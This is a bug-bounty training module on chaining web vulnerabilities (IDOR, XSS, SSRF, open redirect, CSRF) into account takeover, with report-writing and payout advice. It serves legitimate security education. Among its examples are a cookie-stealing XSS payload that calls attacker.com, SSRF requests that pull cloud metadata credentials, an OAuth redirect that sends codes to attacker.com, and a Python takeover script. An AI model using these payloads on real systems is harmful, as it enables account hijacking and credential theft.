Bug Chaining & Escalation

Bug Hunting • Module 19 • Mastery Track

A single medium-severity bug pays a modest bounty. But when you chain that medium with two other findings into a full account takeover, the payout can multiply tenfold. Bug chaining is the art of combining individually low-impact vulnerabilities into attack sequences that demonstrate critical business impact. This is where experienced hunters separate themselves from beginners — not by finding different bugs, but by demonstrating what those bugs mean together.

Section 01

Why Chaining Matters

Most vulnerabilities found during bug bounty research are not critical in isolation. An open redirect is informational. A self-XSS is out of scope. An IDOR that leaks non-sensitive metadata is a low. Individually, these findings generate small payouts or no payout at all. But vulnerabilities do not exist in isolation — they exist within the context of an application's complete functionality, authentication system, and business logic. When you demonstrate how multiple weaknesses combine to create a critical attack path, you are no longer reporting isolated bugs. You are demonstrating real-world attack scenarios.

The Economics of Chaining

Consider the math. A typical bug bounty program might pay:

Severity Individual Payout Example
Informational $0 - $100 Open redirect, verbose error messages
Low $100 - $500 Self-XSS, CSRF on non-sensitive action
Medium $500 - $2,000 Stored XSS, IDOR on non-critical data
Critical $5,000 - $25,000+ Account takeover, RCE, mass data exposure

Three medium findings reported separately: $500 + $500 + $500 = $1,500. Those same three findings chained into a demonstrated account takeover: $10,000 or more. The bugs are identical. The difference is presentation and proof of impact. Programs reward chains at higher severity because the chain represents the actual risk to their business, not the theoretical severity of each component.

How Platforms Evaluate Chains

When a triager receives a chain report, they evaluate it based on the cumulative impact of the complete attack sequence, not the severity of individual components. The key factors are:

  • End-state impact. What can the attacker ultimately achieve? Account takeover, data exfiltration, privilege escalation, and remote code execution are the highest-impact end states.
  • Attack complexity. How many steps does the chain require? Does it need user interaction? Can it be automated? A five-step chain that requires the victim to click a link is still critical if the end result is account takeover.
  • Preconditions. Does the attacker need an authenticated account? Network access? Specific timing? Fewer preconditions mean higher severity.
  • Blast radius. Does the chain affect one user, all users, or the entire system? A chain that can be replayed against any user is significantly more severe than one targeting a specific account.
ℹ
Impact-Driven Thinking
The fundamental shift in mindset is this: stop asking "what vulnerability class is this?" and start asking "what can I do with this?" A reflected XSS is a medium. A reflected XSS that steals an OAuth token from a callback URL, which grants access to the admin panel, which allows modification of all user accounts — that is a critical. The vulnerability class did not change. The demonstrated impact did.
Section 02

Common Chain Patterns

While every chain is unique to the application it targets, certain patterns appear repeatedly across bug bounty programs. Learning these patterns gives you a mental framework for recognizing chain opportunities when you encounter individual bugs during testing.

Pattern 1: IDOR + XSS = Account Takeover

An IDOR that leaks a user's email address combined with an XSS that can steal session tokens creates a full account takeover chain. The IDOR provides the target's information (identifying which accounts to attack), and the XSS provides the mechanism to hijack their session. Neither bug alone is critical, but together they allow an attacker to take over any account on the platform.

// Step 1: IDOR leaks user data GET /api/users/12345/settings HTTP/2 // Response: {"email":"victim@corp.com","role":"admin","api_key":"sk_live_..."} // Step 2: XSS steals session via crafted link sent to the admin https://app.target.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script> // Step 3: Attacker uses stolen session to access admin panel // Impact: Full account takeover of admin user with leaked API key

Pattern 2: SSRF + Cloud Metadata = RCE

A Server-Side Request Forgery that can reach the cloud metadata endpoint (169.254.169.254) can retrieve IAM role credentials. If those credentials have broad permissions (common in misconfigured AWS environments), the attacker can access S3 buckets, modify Lambda functions, or spin up EC2 instances — effectively achieving remote code execution through the cloud control plane.

// Step 1: SSRF via image URL parameter POST /api/fetch-preview HTTP/2 Content-Type: application/json {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"} // Response reveals IAM role name: "webapp-prod-role" // Step 2: Retrieve temporary credentials {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-prod-role"} // Response: AccessKeyId, SecretAccessKey, Token // Step 3: Use credentials to access AWS resources aws s3 ls --profile stolen-creds aws lambda update-function-code --function-name prod-api ... // Impact: Full cloud infrastructure compromise via SSRF

Pattern 3: Open Redirect + OAuth = Token Theft

OAuth implementations validate the redirect URI to prevent authorization codes and tokens from being sent to attacker-controlled servers. But if the application has an open redirect on an allowed domain, the attacker can chain it: the OAuth flow redirects to the legitimate domain, which then redirects (with the token in the URL fragment or query string) to the attacker's server.

// Step 1: Find open redirect https://app.target.com/redirect?url=https://attacker.com // Confirmed: 302 redirect to attacker.com // Step 2: Chain with OAuth authorization flow https://accounts.google.com/o/oauth2/auth? client_id=TARGET_CLIENT_ID& redirect_uri=https://app.target.com/redirect?url=https://attacker.com& response_type=code& scope=openid email profile // Step 3: Victim clicks link, authenticates with Google // Google redirects to: https://app.target.com/redirect?url=https://attacker.com&code=AUTH_CODE // App redirects to: https://attacker.com&code=AUTH_CODE // Attacker exchanges code for access token // Impact: Full OAuth account takeover

Pattern 4: Info Disclosure + CSRF = Privilege Escalation

An information disclosure that reveals a CSRF token or API key combined with a CSRF vulnerability on a privilege-changing endpoint creates a privilege escalation chain. The info disclosure provides the secret needed to bypass CSRF protections, and the CSRF allows the attacker to perform actions as the victim.

Pattern 5: Self-XSS + CSRF = Stored XSS

Self-XSS (XSS that only executes in your own session) is typically out of scope because it requires the victim to paste malicious code into their own browser. But when combined with a CSRF vulnerability, the attacker can force the victim's browser to submit the XSS payload into the victim's own profile or settings, converting a self-XSS into a stored XSS that fires when anyone views the victim's profile.

More Chain Templates
Race Condition + IDOR: Exploit a time-of-check-to-time-of-use gap to access resources during a brief window where authorization is not enforced.

Subdomain Takeover + Cookie Scope: Claim an abandoned subdomain, set cookies scoped to the parent domain, and hijack sessions on the main application.

CORS Misconfiguration + Sensitive Data: A permissive CORS policy on an endpoint that returns PII enables cross-origin data theft from any website the victim visits.
Recognizing Chain Opportunities
When you find any individual bug, ask these questions before reporting:

Can this bug leak data that enables another attack?

Can this bug bypass a protection that blocks another attack?

Can this bug be combined with a known out-of-scope issue to create an in-scope chain?

What is the worst-case outcome if I chain this with everything else I know about the target?
Do Not Force Chains
Not every bug needs to be part of a chain. If you have a clear, high-severity finding, report it on its own. Chains are most valuable when the individual components would be low or medium severity on their own. Trying to artificially inflate a finding by adding unnecessary chain steps will annoy triagers and can lead to downgraded ratings.
Section 03

Impact Amplification

Impact amplification is the practice of taking a finding and demonstrating the maximum realistic damage an attacker could achieve with it. This is different from chaining because you are working with a single vulnerability — but you are exploring its full implications rather than accepting the surface-level impact.

Turning Informational Into High

Many informational findings become high-severity when you demonstrate their downstream consequences. Consider these escalation paths:

Exposed .git Directory
On its own: informational. After reconstruction: you have the complete source code including database credentials, API keys, internal endpoint documentation, and deployment scripts. Report the .git exposure with a demonstration of what the reconstructed source reveals — hardcoded secrets and internal architecture.
Verbose Error Messages
A stack trace that reveals the database type, ORM version, internal file paths, and table structure is informational. But if you use that information to craft a targeted SQL injection that the error message's details made possible, the error message becomes a critical enabler. Include both the information disclosure and the exploitation it enabled.
Email Address Enumeration
Login forms that distinguish between "user not found" and "wrong password" are a low finding. But demonstrate that the enumerated emails can be used for credential stuffing (cross-reference with breach databases), targeted phishing (corporate emails in a B2B application), or account takeover via password reset flow analysis — the impact compounds.

Demonstrating Business Impact

Triagers and security teams respond to business impact, not technical jargon. Frame your findings in terms the business cares about:

Technical Description

  • • "IDOR on GET /api/invoices/{id}"
  • • "Reflected XSS via search parameter"
  • • "SSRF via PDF generation feature"
  • • "Missing rate limit on login endpoint"

Business Impact Framing

  • • "Any user can download any customer's invoices, exposing billing data for all 50,000 accounts"
  • • "An attacker can steal admin session tokens, gaining access to the full customer management panel"
  • • "Internal network scanning reveals 3 internal services including the production database"
  • • "Brute-force attack can compromise accounts at 10,000 attempts/minute with no lockout"

PII Exposure Amplification

When a vulnerability exposes personally identifiable information, the severity depends on the type and volume of data exposed. An IDOR that leaks usernames is low. The same IDOR that also leaks email addresses, phone numbers, physical addresses, and payment card last-four digits is high. And if the IDOR is iterable (sequential IDs that can be enumerated programmatically), the exposure scales to the entire user base, pushing the severity to critical.

When reporting PII exposure, always enumerate exactly what data types are accessible and estimate the total number of affected records. "Affects approximately 2.3 million user records" carries far more weight than "affects multiple users." You can estimate the record count by checking the highest valid user ID without actually accessing more than a handful of records for your proof of concept.

✓
Regulatory Implications Add Weight
When a finding would trigger regulatory notification requirements, mention it. "This vulnerability exposes health data subject to HIPAA" or "This endpoint leaks EU user data in violation of GDPR Article 32" signals to the security team that remediation is not optional — it is a legal requirement. Regulatory context transforms a technical finding into a compliance incident, which accelerates remediation and often increases the bounty.
Section 04

🔨 Multi-Step Exploitation

A chain report must tell a story. The triager reading it needs to follow the attack from beginning to end, understanding why each step is necessary and how it enables the next. Multi-step exploitation is as much about communication as it is about technical skill. A brilliant chain that is poorly documented will be downgraded or rejected.

Building the Exploitation Narrative

Structure your chain as a numbered sequence where each step has a clear purpose and a clear output that feeds into the next step:

  1. Setup. Describe the attacker's starting position. What accounts do they have? What access do they start with? What information is publicly available? The preconditions must be realistic — "attacker has a free user account" is reasonable; "attacker has physical access to the server room" is not.
  2. Reconnaissance step. Show how the attacker discovers the information needed for the next step. This might be exploiting the info disclosure to learn about internal endpoints, or using the IDOR to identify the target account.
  3. Exploitation steps. Each step should include the exact HTTP request, the response, and an explanation of why this response is abnormal or exploitable. Show the data flowing from one step to the next.
  4. End state. Demonstrate the final impact. Show the admin panel you accessed, the data you retrieved, the action you performed as the victim. This is the screenshot or response that makes the triager understand the severity.

Documenting Chains Visually

A flowchart or diagram of your chain is worth a thousand words in a report. Even a simple text-based diagram makes the attack sequence immediately clear:

Attack Flow Diagram: [Attacker] --(1) IDOR on /api/users--> [Leak victim email + role] | v [Attacker] --(2) Open redirect on /goto--> [Craft OAuth phishing link] | v [Victim clicks link] --(3) OAuth code redirect--> [Code sent to attacker via redirect] | v [Attacker] --(4) Exchange code for token--> [Full account access] | v [Attacker] --(5) Access admin panel--> [CRITICAL: Modify all user accounts]

Maintaining State Across Steps

Complex chains often require maintaining state between steps: a session token from step one is used in step three, a CSRF token leaked in step two is submitted in step four. Document every piece of state that carries between steps and explain where it came from. Triagers who cannot reproduce your chain because they missed a state dependency will mark the report as incomplete.

For automated reproduction, consider providing a script that executes the complete chain end-to-end. A Python script using the requests library that performs each step sequentially is the gold standard for chain reports:

# Chain proof-of-concept script import requests session = requests.Session() BASE = "https://app.target.com" # Step 1: IDOR to leak admin email resp = session.get(f"{BASE}/api/users/1/settings", headers={"Authorization": "Bearer USER_TOKEN"}) admin_email = resp.json()["email"] print(f"[+] Admin email: {admin_email}") # Step 2: CSRF token leak via info disclosure resp = session.get(f"{BASE}/api/debug/session") csrf_token = resp.json()["csrf_token"] print(f"[+] CSRF token: {csrf_token}") # Step 3: Use CSRF to change admin email to attacker's resp = session.post(f"{BASE}/api/users/1/email", json={"email": "attacker@evil.com", "csrf": csrf_token}) print(f"[+] Email changed: {resp.status_code}") # Step 4: Trigger password reset to attacker's email resp = session.post(f"{BASE}/api/password-reset", json={"email": "attacker@evil.com"}) print(f"[+] Password reset sent: {resp.status_code}") print("[+] Chain complete: admin account takeover")

Timing-Dependent Chains

Some chains depend on precise timing: race conditions where two requests must arrive within milliseconds, token expiration windows that create brief opportunities, or cache invalidation delays that expose stale data. For these chains, provide timing details in your report, explain the window of opportunity, and consider recording a video of the successful exploitation. If the timing window is very narrow, explain how the attack could be automated to increase success rate.

ℹ
Video Evidence for Complex Chains
For chains with more than three steps, a screen recording of the exploitation is more convincing than screenshots alone. Tools like OBS Studio (free) can record your browser and terminal simultaneously. Narrate or annotate the video to explain what is happening at each step. A two-minute video that shows the complete chain from attacker starting position to final impact is the most effective evidence you can provide.
Section 05

Writing Chain Reports

A chain report is fundamentally different from a single-bug report. It requires a narrative structure that guides the reader through an attack sequence, explains why each component matters, and proves that the cumulative impact exceeds what any individual component would achieve alone. The goal is to make the triager understand the complete attack scenario within the first two paragraphs.

Report Structure for Chains

Chain Report Template
The structure that maximizes chain acceptance and payout
▼

Title: State the end impact, not the components. "Account Takeover via IDOR + Open Redirect + OAuth Flow" — not "Multiple vulnerabilities found."

Executive Summary (2-3 sentences): Describe the complete attack in plain language. "An attacker with a free account can take over any user's account, including administrators, by chaining three vulnerabilities: an IDOR that leaks user emails, an open redirect on the OAuth callback, and insufficient redirect URI validation. This allows full access to the admin panel and all customer data."

Severity Assessment: Score based on the cumulative impact, not individual components. Explain why the chain severity exceeds the parts: "Individual components: Medium, Low, Medium. Chain impact: Critical (P1). The chain enables unauthenticated account takeover of any user including administrators."

Affected Components: List every endpoint, parameter, and feature involved in the chain.

Attack Flow: Visual diagram of the chain (text-based is fine).

Step-by-Step Reproduction: Numbered steps with exact HTTP requests and responses for each stage. Mark the output of each step that feeds into the next.

Proof of Concept: Screenshots, HTTP request/response pairs, and ideally a video or automation script.

Impact Analysis: Quantify the impact: number of affected users, types of data exposed, actions the attacker can take.

Remediation: Address each component separately. "Fix the IDOR by implementing authorization checks. Fix the open redirect by validating against a whitelist. Fix the OAuth flow by enforcing strict redirect URI matching."

The Narrative Approach

Write the report as a story with a clear beginning, middle, and end. The beginning establishes the attacker's starting position and motivation. The middle walks through each exploitation step. The end demonstrates the devastating outcome. This narrative structure is more persuasive than a dry list of technical findings because it helps the triager (and ultimately the development team) understand the real-world attack scenario.

Use transitional phrases between steps: "Using the email obtained in Step 1, the attacker now..." or "Because the application does not validate the redirect parameter, the attacker can leverage this to..." These connections are what distinguish a chain report from a report that simply lists multiple bugs.

CVSS Scoring for Chains

When scoring a chain using CVSS, evaluate the complete attack scenario:

CVSS Metric Single Bug Approach Chain Approach
Attack Complexity Score each bug individually Score the most complex step in the chain
User Interaction Per-bug interaction needs Does the chain require any user interaction at any step?
Impact (CIA) Per-bug impact Cumulative impact of the full chain end-state
Scope Per-bug scope Does the chain cross trust boundaries?
One Report Per Chain
Submit the entire chain as a single report, not as separate reports for each component. If you report the IDOR separately and the XSS separately, you will receive individual payouts for each (lower severity). If you report them as a chain, you receive a single payout for the chain's cumulative impact (higher severity). Additionally, reporting components separately means the triager may fix one component, breaking your chain before you can report it. Always report the chain as one cohesive finding.
Section 06

Real-World Chain Examples

Studying disclosed chains from public bug bounty reports is one of the most effective ways to develop chain-thinking. These examples demonstrate how researchers combined individually modest findings into critical attack sequences that earned significant bounties.

Example 1: GitLab Account Takeover (2020)

CSRF + OAuth Integration = Full Account Takeover
HackerOne disclosure: $33,750 bounty
▼

The researcher discovered that GitLab's OAuth integration with third-party providers had insufficient state validation. The chain:

  • Step 1: Create a GitLab account linked to an attacker-controlled OAuth provider
  • Step 2: Exploit a CSRF vulnerability in the account linking flow to associate the attacker's OAuth credentials with the victim's GitLab account
  • Step 3: Log in via the OAuth provider, which now grants access to the victim's account

Why it worked: The CSRF alone was medium severity (it could link an unwanted OAuth provider). But chained with the OAuth login flow, it became a full account takeover affecting all GitLab users. The researcher clearly documented the state parameter bypass and provided a one-click proof of concept.

Example 2: Shopify Merchant Account Takeover (2019)

Open Redirect + Token Leakage + Password Reset
Disclosed on HackerOne: $15,250 bounty
▼

This chain exploited how Shopify handled password reset tokens in conjunction with an open redirect:

  • Step 1: Identify an open redirect on a Shopify subdomain that preserved URL fragments
  • Step 2: Trigger a password reset for the target merchant. The reset link included a token in the URL
  • Step 3: Craft a URL that passed through the open redirect, leaking the reset token via the Referer header to an attacker-controlled server
  • Step 4: Use the leaked reset token to set a new password and take over the merchant's store

Why it worked: The open redirect was a low. The Referer header leak was informational. But together they created a mechanism to intercept password reset tokens, enabling full merchant account takeover with access to customer data, payment information, and store management.

Example 3: Uber Internal Network Access (2016)

SSRF + Cloud Metadata + Internal Services
Disclosed: $10,000 bounty
▼

A researcher found an SSRF in a feature that fetched URLs provided by users:

  • Step 1: SSRF in a URL preview feature allowed making HTTP requests from Uber's internal network
  • Step 2: Used SSRF to access AWS metadata endpoint, retrieving IAM role credentials
  • Step 3: IAM credentials had access to internal S3 buckets containing source code, deployment configurations, and database connection strings
  • Step 4: Database connection strings allowed direct access to internal databases (demonstrated without actually accessing production data)

Why it worked: The SSRF alone might have been a medium (limited internal access). But by demonstrating the full chain from SSRF to cloud credentials to internal data access, the researcher proved that the SSRF was the entry point to the entire internal infrastructure. The key was demonstrating each escalation step without overstepping ethical boundaries.

Example 4: HackerOne Platform RCE (2020)

Information Disclosure + Deserialization + RCE
Disclosed on HackerOne: $25,000 bounty
▼

A researcher targeted HackerOne's own platform infrastructure:

  • Step 1: Information disclosure revealed the application framework and specific library versions (Rails with a known-vulnerable version of a serialization gem)
  • Step 2: Identified an endpoint that accepted serialized data, intended for internal caching
  • Step 3: Crafted a deserialization payload specific to the disclosed library version, achieving code execution on the server

Why it worked: The information disclosure was low severity on its own. But it provided the exact version information needed to craft a working deserialization exploit. Without the disclosure, the researcher would have been guessing at library versions. The chain converted a low into an RCE.

Example 5: Facebook Pixel Data Theft (2019)

CORS Misconfiguration + Sensitive Endpoint + Mass Data Access
Reported to Facebook: $10,000+ bounty
▼

This chain exploited a CORS misconfiguration on a Facebook Business endpoint:

  • Step 1: Discovered that a specific API endpoint reflected the Origin header in its CORS response without proper validation
  • Step 2: The endpoint returned sensitive business data: pixel configurations, audience data, and advertising performance metrics
  • Step 3: Created a malicious webpage that, when visited by a Facebook Business user, silently exfiltrated their business data via cross-origin requests

Why it worked: A CORS misconfiguration alone is often dismissed as informational. The researcher elevated it by demonstrating which specific sensitive data could be stolen and building a working proof of concept that showed the data theft in action. The business impact — competitor access to advertising data — was the decisive factor.

Study Disclosed Reports

Section 07

Bounty Maximization Strategy

Chaining is a strategic decision, not an automatic one. Sometimes it is more profitable to report findings separately. Sometimes a chain multiplies the value of your findings by an order of magnitude. Understanding when to chain and when to split is a key skill for maximizing your earnings.

When to Chain vs Report Separately

Chain When...

  • • Individual components are low or medium severity
  • • The chain demonstrates a qualitatively different impact (e.g., account takeover)
  • • One component is out of scope individually but enables a critical chain
  • • The chain tells a compelling attack narrative
  • • Fixing any single component breaks the entire chain

Report Separately When...

  • • Each finding is high or critical on its own
  • • The chain does not significantly amplify impact
  • • Components are in completely unrelated features
  • • You risk the program fixing one component before you finish the chain
  • • The sum of individual payouts would exceed the chain payout

Negotiating Chain Value

When a triager evaluates your chain at a lower severity than you believe is justified, you have the right to request reconsideration. Effective negotiation strategies:

  • Reference the program's severity guidelines. Most programs define severity based on impact, not vulnerability class. If your chain achieves account takeover, it meets the program's definition of critical regardless of the individual components.
  • Provide additional proof of impact. If the triager questions the exploitability, provide a more detailed proof of concept or a video demonstration showing the complete attack end-to-end.
  • Cite precedent. If similar chains in the same program or on the same platform were awarded higher bounties, reference those disclosures. Platform consistency matters to triagers.
  • Quantify the blast radius. "This chain affects all 500,000 users" carries more weight than "this chain affects users." Provide the data to support your impact claim.
  • Remain professional. Aggressive or adversarial negotiation harms your reputation. State your case clearly, provide evidence, and accept the final decision gracefully. Your reputation score is a long-term asset.

Building a Reputation for Chain Hunting

Researchers known for high-impact chains receive more private program invitations, get faster triage, and are given the benefit of the doubt on borderline severity decisions. Building this reputation is a deliberate process:

  1. Start with solid single-bug reports. Build a foundation of well-written, valid reports that establish your technical credibility and signal score.
  2. Escalate gradually. Your first chain can be a two-step combination. As your skills develop, build longer and more complex chains. The progression from single bugs to simple chains to complex multi-step attacks is natural.
  3. Publish writeups. When reports are disclosed, write detailed blog posts explaining your chain-finding methodology. The bug bounty community values knowledge sharing, and published chains attract program attention.
  4. Specialize in a domain. Some researchers are known for OAuth chains. Others specialize in SSRF-to-cloud escalation. Others focus on mobile application chains. A specialization makes you the go-to researcher when programs need expertise in that area.

The Stok Approach: Impact-Driven Hunting

STOK, one of the most recognized figures in the bug bounty community, advocates for impact-driven hunting: start with the most critical thing you could do to the target and work backward. Instead of asking "what bugs can I find?", ask "how could I take over an admin account?" or "how could I access the database?" Then systematically test every path to that objective. Bugs become stepping stones toward the objective rather than isolated findings.

This inversion of the typical hunting approach naturally produces chains because you are always thinking about the end goal. A medium-severity XSS is not a report — it is a tool for achieving something bigger. An information disclosure is not a finding — it is intelligence for the next step. This mindset is what separates hunters who earn $500 per bug from those who earn $10,000 per chain.

ℹ
Keep a Chain Notebook
Maintain a running list of low-severity and informational findings for every target you test. When you discover a new finding, review your notebook to see if it connects to anything you found previously. The IDOR you found last month might be the missing piece for a chain with the XSS you found today. Many of the best chains are discovered days or weeks after the individual components were found, through review and connection-making rather than real-time discovery.
